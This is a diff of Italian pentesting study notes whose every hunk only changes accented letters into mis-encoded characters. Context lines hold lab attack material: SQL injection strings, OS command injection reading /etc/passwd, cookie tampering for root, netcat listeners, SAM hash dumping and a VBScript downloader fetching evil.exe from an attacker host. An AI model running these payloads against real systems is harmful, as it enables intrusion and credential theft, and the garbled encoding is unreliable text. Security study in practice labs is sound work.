@@ -77,7 +77,7 @@ csports.exe
 (guess what he do) 
 
 Mylanviewer-setup.exe
-(una specie di nmap ma grafico un pÚ alla zenmap )
+(una specie di nmap ma grafico un p√≤ alla zenmap )
 
 hping3 192.168.0.1 --icmp
 (lo sappiamo tutti cosa fa)
@@ -117,7 +117,7 @@ netdiscover -p
 
 
 fping 192.168.0.1
-(controlla se l' ip Ë vivo or not) 
+(controlla se l' ip √® vivo or not) 
 
 fping -g 192.168.0.1 192.168.0.2 
 (-g sta per il gruppo)
@@ -188,7 +188,7 @@ rpcclient 192.168.0.3 -U admin
 >enumprivs 
 >lsaenumsid
 
-(ricordiamo che funziona se windows firewall Ë spento ) 
+(ricordiamo che funziona se windows firewall √® spento ) 
 
 --enumeration preventing techinques
 Kali:
@@ -406,16 +406,16 @@ View Source (easy)
 
 broken authentication -- Session Management -- Administrative Portals --> hack 
 
-all' interno dell' URL c'Ë un indizio su admin= 0 cambiando il valore di 1.. si passa la challenge 
+all' interno dell' URL c'√® un indizio su admin= 0 cambiando il valore di 1.. si passa la challenge 
 
 --ispeziona il session ID all' interno della URL 
 Session Management -- Session ID in URL --> Hack 
 
-l'ID Ë letteralmente nella URL xD 
+l'ID √® letteralmente nella URL xD 
 
 ---condurre un OS Command Injection Attack 
 
-c'Ë un DNS lookup --> |hostname (bee-box) --> |net user (nobody bee)
+c'√® un DNS lookup --> |hostname (bee-box) --> |net user (nobody bee)
 
 DNS lookup --> |whoami (www-data) --> |pwd (/var/www/bWAPP) 
 --> |cat /etc/passwd 
@@ -483,9 +483,9 @@ m' union all select 1,login,password,secret,5,6,7 from users -- -0
 
 SQL Injection --> Blind Boolean Based --> Hack 
 
-testí or substring(@@version,1,1)=4#
+test¬í or substring(@@version,1,1)=4#
 
-testí or substring(database(),1,1)=íbí#
+test¬í or substring(database(),1,1)=¬íb¬í#
 
 --bypassare il website login usando sql injection
 
@@ -607,7 +607,7 @@ www.google.co.uk
 
 --Steganografia
 
-copy /b ìPLAB.pngî+PLAB.zip PLAB-new.png
+copy /b ¬ìPLAB.png¬î+PLAB.zip PLAB-new.png
 
 7-zip File Manager
 
@@ -684,7 +684,7 @@ Server-to-Server --> next --> Seconda opzione --> next --> Advanced --> Add --> 
 ---Performing Offline Attack 
 
 hyper-V 
-installare kali ma in modalit‡ forensic --> computer --> windows--> system32 --> config --> controllare il file SAM con il terminale (cd /media/root/44.../system32/config --> pwdump SYSTEM SAM )
+installare kali ma in modalit√† forensic --> computer --> windows--> system32 --> config --> controllare il file SAM con il terminale (cd /media/root/44.../system32/config --> pwdump SYSTEM SAM )
 
 copiare il contenuto del file --> inserirlo in un file 
 
@@ -725,7 +725,7 @@ background
 
 -- Malware Analysis 
 IDA 
-(sappiamo gi‡ cosa fa) 
+(sappiamo gi√† cosa fa) 
 
 Stinger
 (usato per rimuovere alcuni virus specifici) 
@@ -784,7 +784,7 @@ Broken Authentication
 
 creare un utente con sempre student 
 check dei cookies utilizzare quelli search mutilliade 
-edit gli uid dei cookies da 24 assegniamo 1 cosÏ da avere i permessi di root 
+edit gli uid dei cookies da 24 assegniamo 1 cos√¨ da avere i permessi di root 
 
 Sensitive Data Exposure
 
@@ -859,7 +859,7 @@ OWASP 2017 -> A6 - Security Misconfiguration -> Method Tampering (GET for POST) 
 
 Burp --> assicurati sia intercept on 
 
-scegliere la voce kimset --> inserire signature --> controllare la voce HTTP History di Burp --> mandare la richiesta al Reapeter --> Repater --> Change request method --> cambiare la voce kimset in telnet e poi andare su Go (effutando cosÏ 2 richieste sia kimset e telnet) 
+scegliere la voce kimset --> inserire signature --> controllare la voce HTTP History di Burp --> mandare la richiesta al Reapeter --> Repater --> Change request method --> cambiare la voce kimset in telnet e poi andare su Go (effutando cos√¨ 2 richieste sia kimset e telnet) 
 
 
 OWASP 2017 -> A6 - Security Misconfiguration -> Unrestricted File Upload menu item.
@@ -898,7 +898,7 @@ nc -lvp 4444
 Chrome:
 Open the "View Blogs" page by navigating to the OWASP 2017 -> A7 - Cross Site Scripting (XSS) -> Persistent (Second Order) -> View someone's blog menu item.
 
-sul men˘ a tendina eseguiamo un click sulla voce attacker 
+sul men√π a tendina eseguiamo un click sulla voce attacker 
 
 attraverso esso abbiamo ottenuto sul terminale il session ID dell' utente di Chrome 
 
@@ -922,7 +922,7 @@ Insecure Deserialization
 
 mutillidae/deserialize.php
 
-click su hi --> modificare la stringa print hi in phpinfo() nella riga 10 ed effettuare la stessa cambiando la riga 10 da riga 13 perÚ modificando il comando in system("id")
+click su hi --> modificare la stringa print hi in phpinfo() nella riga 10 ed effettuare la stessa cambiando la riga 10 da riga 13 per√≤ modificando il comando in system("id")
 
  
 
@@ -1016,7 +1016,7 @@ nc -nvlp 1234
 
 NB: /usr/bin/chsh viene utilizzato per cambiare la password 	
 
-il nostro obbiettivo Ë manipolare l' EIP e mandarlo all' istruzione del kernerl/libreria.dll e saltare le istruizioni ASLR (deve essere buono)
+il nostro obbiettivo √® manipolare l' EIP e mandarlo all' istruzione del kernerl/libreria.dll e saltare le istruizioni ASLR (deve essere buono)
 
 locate nasm_shell 
 /usr/share/metasploit-framework/tools/exploit/nasm_shell.rb
@@ -1033,23 +1033,23 @@ stager
 lavora con altri payload e forniscono una comunicazione con l'attaccante e la vittima 
 
 meterpreter
-lo sappiamo gi‡
+lo sappiamo gi√†
 
 passiveX
-payload che puÚ aiutare a passare alcune regole restrittive dei firewall e lo fa utilizzando il controllo della ActiveX
+payload che pu√≤ aiutare a passare alcune regole restrittive dei firewall e lo fa utilizzando il controllo della ActiveX
 che creano un istanza segreta su Internet Explorer 	
 
 NONX
-NX bit Ë una funzionalit‡ integrate in alcune CPU per impedire l'esecuzione del codice in alcune aree della memoria. Il NONX Ë fatto per passare il DEP (Data Execution Prevention)
+NX bit √® una funzionalit√† integrate in alcune CPU per impedire l'esecuzione del codice in alcune aree della memoria. Il NONX √® fatto per passare il DEP (Data Execution Prevention)
 
 ORD
-Windows stager funionano su ambiente windows e non Ë necessario esplicitare l' indirizzo del destination address.sono piccolissimi ma Ë meno stabile degli altri stagere gira su ws2_32.dll che Ë un processo eseguito prima dell' exploit 
+Windows stager funionano su ambiente windows e non √® necessario esplicitare l' indirizzo del destination address.sono piccolissimi ma √® meno stabile degli altri stagere gira su ws2_32.dll che √® un processo eseguito prima dell' exploit 
 
 IPV6
 payload su IPV6
 
 Reflective DLL 
-Ë una tecnica dove uno stage payload inietta all' host compromesso un processo che gira in memoria senza toccare l'hdd (VNC e Meterptreter sono DLL Injection) 
+√® una tecnica dove uno stage payload inietta all' host compromesso un processo che gira in memoria senza toccare l'hdd (VNC e Meterptreter sono DLL Injection) 
 
 
 brute forcing http directories and files with dirsearch 
@@ -1137,7 +1137,7 @@ echo ts.Write Chr(255 And Ascb(Midb(varByteArray,lngCounter + 1, 1))) >> wget.vb
 echo Next >> wget.vbs
 echo ts.Close >> wget.vbs
 
-utilizzando lo script sar‡ una roba cosÏ:
+utilizzando lo script sar√† una roba cos√¨:
 cscript wget.vbs http://attackerip/evil.exe evil.exe
 
 Potenziare una reverse shell:
